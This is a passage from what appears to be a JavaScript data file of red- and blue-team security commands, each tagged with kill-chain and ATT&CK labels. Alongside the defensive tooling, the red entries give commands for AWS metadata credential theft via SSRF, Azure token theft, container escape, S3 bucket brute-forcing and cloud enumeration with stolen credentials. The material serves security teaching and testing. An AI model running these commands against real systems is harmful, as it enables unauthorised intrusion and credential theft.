      tags: ['whois', 'domain'], command: 'whois DOMAIN',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'domains', owasp: [] },
    { id: 'dnsenum', title: 'DNS Enumeration', team: 'red', category: 'osint',
      description: 'Enumerate DNS records, zone transfers, brute-force subdomains.',
      tags: ['dnsenum', 'dns'], command: 'dnsenum --dnsserver TARGET --enum -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt DOMAIN',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'domains', owasp: [] },
    { id: 'sherlock', title: 'Sherlock Username OSINT', team: 'red', category: 'osint',
      description: 'Find usernames across social networks.',
      tags: ['sherlock', 'username', 'social'], command: 'python3 sherlock USERNAME --print-found',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'domains', owasp: [] },
    { id: 'theharvester-osint', title: 'theHarvester Email Harvest', team: 'red', category: 'osint',
      description: 'Harvest emails, subdomains, and IPs from public sources.',
      tags: ['theharvester', 'email', 'subdomain'], command: 'theHarvester -d DOMAIN -b google,linkedin,dnsdumpster -l 500',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'domains', owasp: [] },
    { id: 'shodan-search', title: 'Shodan Search', team: 'red', category: 'osint',
      description: 'Search internet-facing devices and services.',
      tags: ['shodan', 'iot', 'network'], command: 'shodan search "hostname:DOMAIN"\nshodan host TARGET\nshodan count "apache country:NL"',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'ips', owasp: [] },
    { id: 'censys-search', title: 'Censys Search', team: 'red', category: 'osint',
      description: 'Search certificates and hosts on Censys.',
      tags: ['censys', 'certificates', 'tls'], command: 'censys search "services.tls.certificates.leaf.names: DOMAIN" --index-type hosts',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'domains', owasp: [] },
    { id: 'subfinder-httpx', title: 'Subfinder + httpx Pipeline', team: 'red', category: 'osint',
      description: 'Fast passive subdomain enumeration with live check.',
      tags: ['subfinder', 'httpx', 'subdomain'], command: 'subfinder -d DOMAIN -o subdomains.txt\ncat subdomains.txt | httpx -silent -title -status-code',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'domains', owasp: [] },

    // ── Malware Analysis (NEW) ───────────────────────────
    { id: 'cuckoo-submit', title: 'Cuckoo Sandbox Submit', team: 'blue', category: 'malware',
      description: 'Submit suspicious file to Cuckoo sandbox for behavioral analysis.',
      tags: ['cuckoo', 'sandbox', 'dynamic'], command: 'cuckoo submit suspicious.exe\n# Check analysis status:\ncuckoo status',
      killchain: 'delivery', attack: ['defense-evasion'], pyramid: 'tools', owasp: [] },
    { id: 'yara-rule-scan', title: 'YARA Rule Scan', team: 'blue', category: 'malware',
      description: 'Scan directory with YARA rules for malware indicators.',
      tags: ['yara', 'malware', 'detection'], command: 'yara -r rules.yar /path/to/scan',
      killchain: 'delivery', attack: ['defense-evasion'], pyramid: 'hashes', owasp: [] },
    { id: 'virustotal-hash', title: 'VirusTotal Hash Check', team: 'blue', category: 'malware',
      description: 'Query VirusTotal for file hash reputation.',
      tags: ['virustotal', 'hash', 'ioc'], command: 'curl -s "https://www.virustotal.com/api/v3/files/$(sha256sum suspect.exe | cut -d" " -f1)" -H "x-apikey: $VT_API_KEY" | jq .data.attributes.last_analysis_stats',
      killchain: 'delivery', attack: ['defense-evasion'], pyramid: 'hashes', owasp: [] },
    { id: 'remnux-analysis', title: 'REMnux Static Analysis', team: 'blue', category: 'malware',
      description: 'Static analysis pipeline on REMnux distro.',
      tags: ['remnux', 'static', 'malware'], command: 'file suspect.exe && exiftool suspect.exe && ssdeep suspect.exe && pescan suspect.exe',
      killchain: 'delivery', attack: ['defense-evasion'], pyramid: 'tools', owasp: [] },
    { id: 'ghidra-decompile', title: 'Ghidra Decompile', team: 'blue', category: 'malware',
      description: 'Decompile binary with Ghidra headless analyzer.',
      tags: ['ghidra', 'reverse', 'decompile'], command: 'analyzeHeadless /tmp/ghidra_project project -import suspect.exe -postScript DecompileAllFunctions.java -scriptlog /tmp/decompile.log',
      killchain: 'delivery', attack: ['defense-evasion'], pyramid: 'tools', owasp: [] },
    { id: 'olevba-macro', title: 'OleVBA Macro Analysis', team: 'blue', category: 'malware',
      description: 'Extract and analyze VBA macros from Office documents.',
      tags: ['olevba', 'macro', 'office'], command: 'olevba --deobf suspect.docm\nolevba --decode suspect.xlsm',
      killchain: 'delivery', attack: ['execution'], pyramid: 'tools', owasp: [] },
    { id: 'floss-strings', title: 'FLOSS Obfuscated Strings', team: 'blue', category: 'malware',
      description: 'Extract obfuscated strings that regular strings misses.',
      tags: ['floss', 'strings', 'obfuscation'], command: 'floss suspect.exe -n 6 --no-static-strings',
      killchain: 'delivery', attack: ['defense-evasion'], pyramid: 'tools', owasp: [] },
    { id: 'capa-capabilities', title: 'capa Capability Detection', team: 'blue', category: 'malware',
      description: 'Detect capabilities of a PE/ELF binary using capa rules.',
      tags: ['capa', 'capabilities', 'static'], command: 'capa suspect.exe -v\ncapa suspect.exe -j | jq .rules',
      killchain: 'delivery', attack: ['defense-evasion'], pyramid: 'tools', owasp: [] },
    { id: 'sandbox-any-run', title: 'ANY.RUN Sandbox', team: 'blue', category: 'malware',
      description: 'Interactive malware sandbox submission.',
      tags: ['sandbox', 'dynamic', 'any.run'], command: '# Upload to https://app.any.run\n# Alternative API:\ncurl -X POST "https://api.any.run/v1/analysis" -H "Authorization: API-Key $ANYRUN_KEY" -F "file=@suspect.exe" -F "env_os=windows" -F "env_bitness=64"',
      killchain: 'delivery', attack: ['defense-evasion'], pyramid: 'tools', owasp: [] },

    // ── Incident Response (NEW) ──────────────────────────
    { id: 'ir-collect-linux', title: 'IR Evidence Collect (Linux)', team: 'blue', category: 'ir',
      description: 'Quick evidence collection for incident response.',
      tags: ['ir', 'evidence', 'linux'], command: 'mkdir -p /tmp/ir_evidence && cd /tmp/ir_evidence\ndate > timestamp.txt\nps auxf > processes.txt\nss -tulpen > network.txt\nnetstat -rn > routes.txt\nlast -Faixw > logins.txt\ncat /etc_passwd > users.txt\ncrontab -l > cron.txt 2>&1\nfind / -mtime -1 -type f 2>/dev/null > modified_24h.txt\ntar czf ir_evidence.tar.gz /tmp/ir_evidence/',
      killchain: 'actions', attack: ['collection'], pyramid: 'artifacts', owasp: [] },
    { id: 'ir-collect-windows', title: 'IR Evidence Collect (Windows)', team: 'blue', category: 'ir',
      description: 'Quick evidence collection on Windows.',
      tags: ['ir', 'evidence', 'windows'], command: 'mkdir C:\\IR_Evidence\nwhoami /all > C:\\IR_Evidence\\user.txt\nnetstat -anob > C:\\IR_Evidence\\network.txt\ntasklist /v > C:\\IR_Evidence\\processes.txt\nwevtutil qe Security /c:100 /f:text /rd:true > C:\\IR_Evidence\\security_events.txt\nschtasks /query /fo TABLE /v > C:\\IR_Evidence\\scheduled_tasks.txt\nreg export HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run C:\\IR_Evidence\\autorun.reg',
      killchain: 'actions', attack: ['collection'], pyramid: 'artifacts', owasp: [] },
    { id: 'thehive-alert', title: 'TheHive Create Alert', team: 'blue', category: 'ir',
      description: 'Create incident alert in TheHive SIRP.',
      tags: ['thehive', 'sirp', 'alert'], command: 'curl -XPOST http://THEHIVE_URL/api/alert -H "Authorization: Bearer $THEHIVE_KEY" -H "Content-Type: application/json" -d \'{"title":"Security Alert","description":"Suspicious activity detected on TARGET","type":"external","source":"Toolbelt","severity":2}\'',
      killchain: 'actions', attack: ['collection'], pyramid: 'tools', owasp: [] },
    { id: 'ir-containment', title: 'IR Containment Actions', team: 'blue', category: 'ir',
      description: 'Quick containment steps — isolate host, block IP, disable account.',
      tags: ['ir', 'containment', 'block'], command: '# Block attacker IP:\niptables -A INPUT -s ATTACKER_IP -j DROP\n# Disable compromised user:\nusermod -L compromised_user\npasswd -l compromised_user\n# Kill suspicious process:\nkill -9 $(pgrep suspicious_proc)',
      killchain: 'actions', attack: ['impact'], pyramid: 'ips', owasp: [] },
    { id: 'ir-yara-sweep', title: 'YARA IOC Sweep', team: 'blue', category: 'ir',
      description: 'Sweep filesystem for IOCs using YARA rules.',
      tags: ['yara', 'ioc', 'sweep'], command: 'yara -r /opt/yara-rules/malware/ /tmp/\nyara -r /opt/yara-rules/malware/ /var/www/',
      killchain: 'actions', attack: ['collection'], pyramid: 'artifacts', owasp: [] },
    { id: 'ir-timeline-linux', title: 'IR Timeline (Linux)', team: 'blue', category: 'ir',
      description: 'Build activity timeline from Linux logs.',
      tags: ['ir', 'timeline', 'linux'], command: 'cat /var/log/auth.log | grep -iE "accepted|failed|session" > /tmp/auth_timeline.txt\njournalctl --since "24 hours ago" --no-pager > /tmp/journal_24h.txt\nlast -Faixw > /tmp/logins.txt\nausearch -ts today > /tmp/audit_today.txt',
      killchain: 'actions', attack: ['collection'], pyramid: 'artifacts', owasp: [] },
    { id: 'ir-timeline-windows', title: 'IR Timeline (Windows)', team: 'blue', category: 'ir',
      description: 'Build activity timeline from Windows event logs.',
      tags: ['ir', 'timeline', 'windows', 'evtx'], command: 'wevtutil qe Security /q:"*[System[(EventID=4624 or EventID=4625 or EventID=4648 or EventID=4672)]]" /f:text /rd:true /c:200 > logon_events.txt\nwevtutil qe System /q:"*[System[(EventID=7045 or EventID=7036)]]" /f:text /c:100 > service_events.txt\nwevtutil qe "Microsoft-Windows-PowerShell/Operational" /c:100 /f:text /rd:true > ps_events.txt',
      killchain: 'actions', attack: ['collection'], pyramid: 'artifacts', owasp: [], os: 'windows' },
    { id: 'velociraptor-collect', title: 'Velociraptor Collection', team: 'blue', category: 'ir',
      description: 'Collect artifacts with Velociraptor for IR.',
      tags: ['velociraptor', 'ir', 'collection'], command: '# Collect from client:\nvelociraptor --config server.config.yaml query "SELECT * FROM Artifact.Windows.System.Pslist()" --format=csv\n# Offline collector:\nvelociraptor artifacts collect Windows.KapeFiles.Targets --output /tmp/evidence.zip',
      killchain: 'actions', attack: ['collection'], pyramid: 'tools', owasp: [] },

    // ═══════════════════════════════════════════════════════
    //  BLUE TEAM — Defensive Tools / Checks
    // ═══════════════════════════════════════════════════════
    { id: 'blue-fw-rules', title: 'Review Firewall Rules', team: 'blue', category: 'defense',
      description: 'Audit iptables / nftables rules for open ports.',
      tags: ['firewall', 'audit', 'linux'], command: 'iptables -L -n -v\n# or nftables:\nnft list ruleset',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'ips', owasp: ['A05'] },
    { id: 'blue-fail2ban', title: 'Fail2ban Status', team: 'blue', category: 'defense',
      description: 'Check fail2ban jails for brute-force protection.',
      tags: ['fail2ban', 'brute-force'], command: 'fail2ban-client status\nfail2ban-client status sshd',
      killchain: 'exploitation', attack: ['credential-access'], pyramid: 'ips', owasp: ['A07'] },
    { id: 'blue-auth-logs', title: 'Auth Log Analysis', team: 'blue', category: 'defense',
      description: 'Search for failed logins and suspicious auth events.',
      tags: ['logs', 'auth', 'linux'], command: 'grep -i "failed\\|invalid\\|error" /var/log/auth.log | tail -50\n# or journalctl:\njournalctl -u sshd --since "1 hour ago" | grep -i fail',
      killchain: 'exploitation', attack: ['credential-access', 'initial-access'], pyramid: 'artifacts', owasp: ['A07', 'A09'] },
    { id: 'blue-process-audit', title: 'Process Audit', team: 'blue', category: 'defense',
      description: 'Check running processes for anomalies.',
      tags: ['processes', 'audit', 'linux'], command: 'ps auxf | grep -v "\\[" | head -50\n# Network connections by process:\nlsof -i -P -n | grep ESTABLISHED',
      killchain: 'installation', attack: ['persistence', 'execution'], pyramid: 'artifacts', owasp: [] },
    { id: 'blue-cron-audit', title: 'Cron Job Audit', team: 'blue', category: 'defense',
      description: 'List all cron jobs across users for backdoor detection.',
      tags: ['cron', 'audit', 'persistence'], command: 'for user in $(cut -f1 -d: /etc_passwd); do echo "=== $user ==="; crontab -l -u $user 2>/dev/null; done\nls -la /etc/cron.d/ /etc/cron.daily/',
      killchain: 'installation', attack: ['persistence'], pyramid: 'artifacts', owasp: [] },
    { id: 'blue-svc-audit', title: 'Systemd Service Audit', team: 'blue', category: 'defense',
      description: 'Find unusual or recently created systemd services.',
      tags: ['systemd', 'audit', 'persistence'], command: 'systemctl list-units --type=service --state=running\n# Recently modified:\nfind /etc/systemd/system -mtime -7 -name "*.service" -ls',
      killchain: 'installation', attack: ['persistence'], pyramid: 'artifacts', owasp: [] },
    { id: 'blue-network-connections', title: 'Active Connection Check', team: 'blue', category: 'defense',
      description: 'Identify suspicious outbound connections (C2 detection).',
      tags: ['network', 'c2', 'detection'], command: 'ss -tupn state established\n# Unusual DNS:\ntcpdump -i any -n port 53 -c 50',
      killchain: 'c2', attack: ['command-control'], pyramid: 'ips', owasp: [] },
    { id: 'blue-dns-monitor', title: 'DNS Query Monitor', team: 'blue', category: 'defense',
      description: 'Watch DNS queries for tunneling or C2 indicators.',
      tags: ['dns', 'monitoring', 'c2'], command: 'tcpdump -i any -n port 53 -l | tee dns_capture.txt',
      killchain: 'c2', attack: ['command-control', 'exfiltration'], pyramid: 'domains', owasp: [] },
    { id: 'blue-hash-check', title: 'File Hash Verification', team: 'blue', category: 'defense',
      description: 'Compute hashes and compare against known-good baselines.',
      tags: ['hash', 'integrity', 'audit'], command: 'sha256sum /usr/bin/* | sort > current_hashes.txt\ndiff baseline_hashes.txt current_hashes.txt',
      killchain: 'installation', attack: ['defense-evasion'], pyramid: 'hashes', owasp: ['A08'] },
    { id: 'blue-header-check', title: 'Security Headers Check', team: 'blue', category: 'defense',
      description: 'Inspect HTTP security headers on a web server.',
      tags: ['headers', 'web', 'audit'], command: 'curl -sI https://TARGET | grep -iE "strict-transport|content-security|x-frame|x-content-type|x-xss|referrer-policy|permissions-policy"',
      killchain: 'delivery', attack: ['initial-access'], pyramid: 'artifacts', owasp: ['A05'] },
    { id: 'blue-ssl-check', title: 'SSL/TLS Audit', team: 'blue', category: 'defense',
      description: 'Check certificate and cipher suite configuration.',
      tags: ['ssl', 'tls', 'audit'], command: 'nmap --script ssl-enum-ciphers -p 443 TARGET\n# or:\nopenssl s_client -connect TARGET:443 -brief',
      killchain: 'delivery', attack: ['initial-access'], pyramid: 'artifacts', owasp: ['A02'] },
    { id: 'blue-user-audit', title: 'User Account Audit', team: 'blue', category: 'defense',
      description: 'Check for unauthorized accounts and privilege escalation.',
      tags: ['users', 'audit', 'linux'], command: 'awk -F: \'$3 == 0 {print $1}\' /etc_passwd\nawk -F: \'$2 != "!" && $2 != "*" {print $1}\' /etc/shadow\ngetent group sudo',
      killchain: 'actions', attack: ['privilege-escalation', 'persistence'], pyramid: 'ttps', owasp: ['A01'] },
    { id: 'blue-schtask-audit', title: 'Scheduled Task Audit (Win)', team: 'blue', category: 'defense',
      description: 'List Windows scheduled tasks for suspicious entries.',
      tags: ['schtasks', 'audit', 'windows'], command: 'schtasks /query /fo TABLE /v | findstr /i "powershell cmd wscript cscript"',
      killchain: 'installation', attack: ['persistence'], pyramid: 'artifacts', owasp: [] },
    { id: 'blue-windows-events', title: 'Windows Event Logs', team: 'blue', category: 'defense',
      description: 'Query security event logs for suspicious activity.',
      tags: ['events', 'audit', 'windows'], command: 'wevtutil qe Security /c:20 /f:text /rd:true\n# Failed logons (4625):\nwevtutil qe Security /q:"*[System[EventID=4625]]" /c:10 /f:text /rd:true',
      killchain: 'exploitation', attack: ['credential-access', 'initial-access'], pyramid: 'artifacts', owasp: ['A09'] },

    // ── Web Hardening (NEW - OWASP focused) ──────────────
    { id: 'blue-csp-check', title: 'CSP Header Audit', team: 'blue', category: 'hardening',
      description: 'Validate Content-Security-Policy header against best practices.',
      tags: ['csp', 'headers', 'xss'], command: 'curl -sI https://TARGET | grep -i content-security-policy\n# Test with: https://csp-evaluator.withgoogle.com/',
      killchain: 'delivery', attack: ['initial-access'], pyramid: 'artifacts', owasp: ['A03', 'A05'] },
    { id: 'blue-cors-check', title: 'CORS Misconfiguration Check', team: 'blue', category: 'hardening',
      description: 'Test for overly permissive CORS headers.',
      tags: ['cors', 'headers', 'web'], command: 'curl -sI -H "Origin: https://evil.com" https://TARGET/api | grep -i "access-control"',
      killchain: 'delivery', attack: ['initial-access'], pyramid: 'artifacts', owasp: ['A01', 'A05'] },
    { id: 'blue-dep-check', title: 'OWASP Dependency Check', team: 'blue', category: 'hardening',
      description: 'Scan project dependencies for known CVEs.',
      tags: ['dependency-check', 'cve', 'sca'], command: 'dependency-check --project "myapp" --scan /path/to/project --format HTML --out dep-report.html',
      killchain: 'delivery', attack: ['initial-access'], pyramid: 'tools', owasp: ['A06'] },
    { id: 'blue-trivy-scan', title: 'Trivy Container Scan', team: 'blue', category: 'hardening',
      description: 'Scan Docker images for vulnerabilities.',
      tags: ['trivy', 'docker', 'container'], command: 'trivy image --severity HIGH,CRITICAL TARGET:latest',
      killchain: 'delivery', attack: ['initial-access'], pyramid: 'tools', owasp: ['A06'] },
    { id: 'blue-semgrep', title: 'Semgrep SAST Scan', team: 'blue', category: 'hardening',
      description: 'Static analysis for common vulnerability patterns.',
      tags: ['semgrep', 'sast', 'code'], command: 'semgrep --config=p/owasp-top-ten /path/to/source',
      killchain: 'delivery', attack: ['initial-access'], pyramid: 'tools', owasp: ['A03', 'A04'] },
    { id: 'blue-zap-scan', title: 'OWASP ZAP Scan', team: 'blue', category: 'hardening',
      description: 'Run OWASP ZAP automated scan against web app.',
      tags: ['zap', 'dast', 'web'], command: 'zap-cli quick-scan -s all -r https://TARGET\n# or Docker:\ndocker run -t zaproxy/zap-stable zap-baseline.py -t https://TARGET',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'tools', owasp: ['A03', 'A05'] },
    { id: 'blue-ssh-hardening', title: 'SSH Hardening Audit', team: 'blue', category: 'hardening',
      description: 'Check SSH configuration for security best practices.',
      tags: ['ssh', 'audit', 'config'], command: 'ssh-audit TARGET\n# Or manually:\ngrep -E "PermitRootLogin|PasswordAuthentication|X11Forwarding|AllowTcpForwarding|MaxAuthTries" /etc/ssh/sshd_config',
      killchain: 'installation', attack: ['initial-access'], pyramid: 'tools', owasp: ['A05'] },
    { id: 'blue-lynis', title: 'Lynis System Audit', team: 'blue', category: 'hardening',
      description: 'Comprehensive Linux security auditing tool.',
      tags: ['lynis', 'audit', 'linux'], command: 'lynis audit system --quick\nlynis show details\nlynis show suggestions',
      killchain: 'actions', attack: ['defense-evasion'], pyramid: 'tools', owasp: [] },
    { id: 'blue-nuclei', title: 'Nuclei Vulnerability Scan', team: 'blue', category: 'hardening',
      description: 'Fast vulnerability scanner with community templates.',
      tags: ['nuclei', 'vuln', 'templates'], command: 'nuclei -u https://TARGET -t cves/ -t exposures/ -t misconfigurations/ -severity critical,high -o results.txt',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'tools', owasp: ['A06'] },
    { id: 'blue-cis-benchmark', title: 'CIS Benchmark Check', team: 'blue', category: 'hardening',
      description: 'Check system against CIS benchmark using OpenSCAP.',
      tags: ['cis', 'benchmark', 'openscap'], command: 'oscap xccdf eval --profile cis_level1 --results results.xml --report report.html /usr/share/xml/scap/ssg/content/ssg-ubuntu2204-ds.xml',
      killchain: 'actions', attack: ['defense-evasion'], pyramid: 'tools', owasp: ['A05'] },
    { id: 'blue-fail2ban-hardening', title: 'Fail2ban Setup & Check', team: 'blue', category: 'hardening',
      description: 'Configure and check fail2ban for brute-force protection.',
      tags: ['fail2ban', 'brute-force', 'linux'], command: 'fail2ban-client status\nfail2ban-client status sshd\n# Check banned IPs:\nfail2ban-client get sshd banip\n# Unban:\nfail2ban-client set sshd unbanip TARGET',
      killchain: 'exploitation', attack: ['initial-access'], pyramid: 'tools', owasp: ['A07'] },

    // ── Log & Detection ─────────────────────────────────
    { id: 'blue-sigma-rules', title: 'Sigma Rule Detection', team: 'blue', category: 'detect',
      description: 'Convert Sigma detection rules to SIEM queries.',
      tags: ['sigma', 'detection', 'siem'], command: 'sigmac -t splunk -c sysmon sigma/rules/windows/process_creation/ > splunk_rules.txt\nsigmac -t elastic-rule -c winlogbeat sigma/rules/windows/process_creation/ > elastic_rules.ndjson',
      killchain: 'actions', attack: ['defense-evasion'], pyramid: 'tools', owasp: [] },
    { id: 'blue-sysmon-config', title: 'Sysmon Configuration', team: 'blue', category: 'detect',
      description: 'Install and configure Sysmon for advanced Windows logging.',
      tags: ['sysmon', 'logging', 'windows'], command: '# Install with SwiftOnSecurity config:\nSysmon64.exe -accepteula -i sysmonconfig-export.xml\n# Update config:\nSysmon64.exe -c sysmonconfig-export.xml\n# Check status:\nSysmon64.exe -s',
      killchain: 'actions', attack: ['defense-evasion'], pyramid: 'tools', owasp: [], os: 'windows' },
    { id: 'blue-auditd-config', title: 'Auditd Configuration', team: 'blue', category: 'detect',
      description: 'Configure Linux auditd for security monitoring.',
      tags: ['auditd', 'logging', 'linux'], command: '# Add rules:\nauditctl -w /etc_passwd -p wa -k identity\nauditctl -w /etc/shadow -p wa -k identity\nauditctl -a always,exit -F arch=b64 -S execve -k exec_log\n# Search:\nausearch -k exec_log -ts today | aureport -x --summary',
      killchain: 'actions', attack: ['defense-evasion'], pyramid: 'tools', owasp: [] },
    { id: 'blue-wazuh-agent', title: 'Wazuh Agent Deploy', team: 'blue', category: 'detect',
      description: 'Deploy Wazuh HIDS/SIEM agent for endpoint monitoring.',
      tags: ['wazuh', 'hids', 'agent'], command: 'curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | gpg --dearmor > /usr/share/keyrings/wazuh.gpg\n# Install:\napt install wazuh-agent\n# Configure manager IP:\nsed -i "s/MANAGER_IP/WAZUH_SERVER/" /var/ossec/etc/ossec.conf\nsystemctl enable --now wazuh-agent',
      killchain: 'actions', attack: ['defense-evasion'], pyramid: 'tools', owasp: [] },
    { id: 'blue-suricata', title: 'Suricata IDS/IPS', team: 'blue', category: 'detect',
      description: 'Run Suricata IDS with ET Open rules.',
      tags: ['suricata', 'ids', 'network'], command: 'suricata-update\nsuricata -c /etc/suricata/suricata.yaml -i eth0\n# Check alerts:\ntail -f /var/log/suricata/fast.log\njq . /var/log/suricata/eve.json | head -100',
      killchain: 'actions', attack: ['command-control'], pyramid: 'ips', owasp: [] },
    { id: 'blue-honeypot', title: 'Honeypot Deploy (T-Pot)', team: 'blue', category: 'detect',
      description: 'Deploy T-Pot multi-honeypot platform.',
      tags: ['honeypot', 'tpot', 'deception'], command: '# Docker T-Pot:\ngit clone https://github.com/telekom-security/tpotce\ncd tpotce && ./install.sh\n# Or single honeypot (Cowrie SSH):\ndocker run -d -p 2222:2222 cowrie/cowrie',
      killchain: 'exploitation', attack: ['initial-access'], pyramid: 'tools', owasp: [] },
    { id: 'blue-canary-token', title: 'Canary Tokens', team: 'blue', category: 'detect',
      description: 'Deploy canary tokens to detect unauthorized access.',
      tags: ['canary', 'deception', 'tripwire'], command: '# Create at https://canarytokens.org\n# Or self-hosted:\n# DNS canary: add TXT record that alerts on lookup\n# File canary: place .docx/.pdf that phones home when opened\n# AWS key canary: fake AWS creds that alert when used',
      killchain: 'actions', attack: ['collection', 'credential-access'], pyramid: 'artifacts', owasp: [] },
    { id: 'blue-elk-query', title: 'ELK/Splunk Threat Hunt', team: 'blue', category: 'detect',
      description: 'Common SIEM queries for threat hunting.',
      tags: ['elk', 'splunk', 'siem', 'hunting'], command: '# Splunk — failed logins:\nindex=windows EventCode=4625 | stats count by src_ip, Account_Name | where count > 10\n# Splunk — PowerShell encoded:\nindex=windows EventCode=4104 ScriptBlockText="*-enc*" OR ScriptBlockText="*FromBase64*"\n# ELK — lateral movement:\nwinlog.event_id:4624 AND winlog.event_data.LogonType:3 | top source.ip',
      killchain: 'actions', attack: ['credential-access', 'lateral-movement'], pyramid: 'tools', owasp: [] },
    { id: 'blue-osquery', title: 'OSQuery Live Queries', team: 'blue', category: 'detect',
      description: 'Query endpoint state with OSQuery for threat hunting.',
      tags: ['osquery', 'edr', 'hunting'], command: '# Listening ports:\nosqueryi "SELECT pid, name, local_address, local_port FROM listening_ports WHERE local_port != 0;"\n# Suspicious processes:\nosqueryi "SELECT name, path, cmdline FROM processes WHERE on_disk = 0;"\n# Startup items:\nosqueryi "SELECT * FROM startup_items;"',
      killchain: 'actions', attack: ['discovery'], pyramid: 'tools', owasp: [] },
    { id: 'blue-zeek-monitor', title: 'Zeek Network Monitor', team: 'blue', category: 'detect',
      description: 'Network security monitoring with Zeek (Bro).',
      tags: ['zeek', 'bro', 'nsm', 'network'], command: 'zeek -i eth0 local\n# Analyze logs:\ncat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p proto service | sort | uniq -c | sort -rn | head -20\ncat dns.log | zeek-cut query | sort | uniq -c | sort -rn | head -20',
      killchain: 'actions', attack: ['command-control'], pyramid: 'ips', owasp: [] },
    { id: 'blue-crowdsec', title: 'CrowdSec Behavioral IDS', team: 'blue', category: 'detect',
      description: 'Collaborative behavioral IDS with crowd-sourced blocklists.',
      tags: ['crowdsec', 'ids', 'collaborative'], command: 'curl -s https://packagecloud.io/install/repositories/crowdsec/crowdsec/script.deb.sh | bash\napt install crowdsec crowdsec-firewall-bouncer-iptables\n# Check decisions:\ncscli decisions list\n# Check alerts:\ncscli alerts list',
      killchain: 'actions', attack: ['initial-access'], pyramid: 'tools', owasp: [] },

    // ═══════════════════════════════════════════════════════
    //  CLOUD & CONTAINER — AWS, Azure, Docker, K8s
    // ═══════════════════════════════════════════════════════
    { id: 'aws-enum-s3', title: 'AWS S3 Bucket Enum', team: 'red', category: 'cloud',
      description: 'Enumerate public S3 buckets and list contents.',
      tags: ['aws', 'cloud', 's3'], command: 'aws s3 ls s3://DOMAIN --no-sign-request\n# Brute-force bucket names:\nfor b in $(cat buckets.txt); do aws s3 ls s3://$b --no-sign-request 2>/dev/null && echo "OPEN: $b"; done',
      killchain: 'recon', attack: ['reconnaissance', 'collection'], pyramid: 'artifacts', owasp: ['A01', 'A05'] },
    { id: 'aws-enum-iam', title: 'AWS IAM Enumeration', team: 'red', category: 'cloud',
      description: 'Enumerate IAM users, roles, and policies with stolen creds.',
      tags: ['aws', 'cloud', 'iam', 'pacu'], command: 'aws sts get-caller-identity\naws iam list-users\naws iam list-roles\naws iam list-attached-user-policies --user-name USER',
      killchain: 'recon', attack: ['discovery', 'credential-access'], pyramid: 'ttps', owasp: ['A01'] },
    { id: 'aws-metadata', title: 'AWS Metadata SSRF', team: 'red', category: 'cloud',
      description: 'Access EC2 instance metadata via SSRF (IMDSv1).',
      tags: ['aws', 'cloud', 'ssrf', 'metadata'], command: 'curl -s http://169.254.169.254/latest/meta-data/\ncurl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/\ncurl -s http://169.254.169.254/latest/user-data',
      killchain: 'exploitation', attack: ['credential-access', 'collection'], pyramid: 'ttps', owasp: ['A10'] },
    { id: 'azure-enum', title: 'Azure AD Enumeration', team: 'red', category: 'cloud',
      description: 'Enumerate Azure AD tenant, users, and apps.',
      tags: ['azure', 'cloud', 'aad'], command: '# Check tenant exists:\ncurl -s "https://login.microsoftonline.com/DOMAIN/.well-known/openid-configuration" | jq .token_endpoint\n# AADInternals:\nInvoke-AADIntReconAsOutsider -DomainName DOMAIN',
      killchain: 'recon', attack: ['reconnaissance', 'discovery'], pyramid: 'domains', owasp: ['A01'] },
    { id: 'docker-escape', title: 'Docker Container Escape', team: 'red', category: 'cloud',
      description: 'Check for container escape vectors.',
      tags: ['docker', 'container', 'escape'], command: '# Check if in container:\ncat /proc/1/cgroup | grep -i docker\n# Mounted docker socket?\nls -la /var/run/docker.sock\n# Privileged container escape:\nmount /dev/sda1 /mnt && chroot /mnt',
      killchain: 'actions', attack: ['privilege-escalation'], pyramid: 'ttps', owasp: ['A05'] },
    { id: 'k8s-enum', title: 'Kubernetes Enumeration', team: 'red', category: 'cloud',
      description: 'Enumerate K8s resources from a compromised pod.',
      tags: ['kubernetes', 'k8s', 'cloud'], command: '# Check if in K8s:\nenv | grep KUBERNETES\nls /var/run/secrets/kubernetes.io/serviceaccount/\n# Enumerate with token:\nTOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\ncurl -sk https://kubernetes.default/api/v1/namespaces -H "Authorization: Bearer $TOKEN"',
      killchain: 'recon', attack: ['discovery'], pyramid: 'ttps', owasp: ['A01', 'A05'] },
    { id: 'prowler-audit', title: 'Prowler AWS Audit', team: 'blue', category: 'cloud',
      description: 'AWS security best practices assessment.',
      tags: ['prowler', 'aws', 'cloud', 'audit'], command: 'prowler aws --severity critical high\n# Specific checks:\nprowler aws -c s3_bucket_public_access iam_root_mfa_enabled',
      killchain: 'recon', attack: ['discovery'], pyramid: 'tools', owasp: ['A05'] },
    { id: 'scoutsuite', title: 'ScoutSuite Cloud Audit', team: 'blue', category: 'cloud',
      description: 'Multi-cloud security auditing tool (AWS, Azure, GCP).',
      tags: ['scoutsuite', 'cloud', 'audit'], command: 'scout aws --profile default\nscout azure --cli',
      killchain: 'recon', attack: ['discovery'], pyramid: 'tools', owasp: ['A05'] },
    { id: 'gcp-enum', title: 'GCP Enumeration', team: 'red', category: 'cloud',
      description: 'Enumerate GCP project resources with compromised credentials.',
      tags: ['gcp', 'cloud', 'google'], command: 'gcloud projects list\ngcloud compute instances list\ngcloud storage ls\ngcloud iam service-accounts list\ngcloud functions list',
      killchain: 'recon', attack: ['discovery'], pyramid: 'ttps', owasp: ['A01'] },
    { id: 'azure-token-steal', title: 'Azure Token Theft', team: 'red', category: 'cloud',
      description: 'Steal Azure access tokens from logged-in sessions.',
      tags: ['azure', 'cloud', 'token'], command: '# PowerShell — steal token from Az module cache:\n$token = (Get-AzAccessToken).Token\n# Or from metadata:\ncurl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"',
